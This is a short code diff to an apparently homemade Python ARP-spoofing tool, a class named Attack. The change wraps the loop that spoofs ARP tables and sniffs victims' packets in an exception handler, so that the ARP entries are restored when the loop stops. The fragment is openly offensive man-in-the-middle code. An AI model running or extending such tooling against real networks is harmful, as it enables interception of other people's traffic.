@@ -64,7 +64,7 @@ class Attack():
         for v in self.victim:
             self.restore(v, self.ap)
             self.restore(self.ap, v)
-        time.sleep(0.1)
+        exit(0)
     
     def sniff_packets(self):
         for v in self.victim:
@@ -80,6 +80,9 @@ attack.get_ip()
 attack.get_mac(attack.network[1])
 print(attack.attacker, attack.victim, attack.ap)
 print(attack.interfaces, attack.ip_list, '\n', attack.ip_mac, '\n', attack.network)
-while 1:
-    attack.arp_spoofing()
-    attack.sniff_packets()
+try:
+    while 1:
+        attack.arp_spoofing()
+        attack.sniff_packets()
+except:
+    attack.ret_arp_spoofing()
